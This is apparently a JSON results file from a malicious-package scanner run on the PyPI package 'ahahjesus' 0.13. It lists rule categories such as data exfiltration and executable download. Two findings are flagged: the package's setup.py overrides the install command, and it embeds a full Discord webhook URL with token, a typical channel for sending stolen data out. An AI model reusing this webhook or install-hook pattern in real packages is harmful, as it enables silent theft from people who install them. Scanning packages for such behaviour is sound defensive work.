@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": {},
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:26",
+                "code": "setup(\n  name = 'ahahjesus',\n  packages=find_packages(),\n  version = '0.13',\n  description = 'Yes.',\n  author = 'haha.',\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n  install_re...d,\n  },\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "obfuscation": {},
+        "shady-links": [
+            {
+                "location": "setup.py:18",
+                "code": "                webhook = Webhook.from_url('https://discord.com/api/webhooks/1025846754916188171/zQZcaJpTytEpfnUx0ZSRRKXtXO5Ng38EaoaKBBu58_ZEfLQlyQECn7gZLjUF7PWY-Tpb', session=session)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/ahahjesus-0.13"
+}
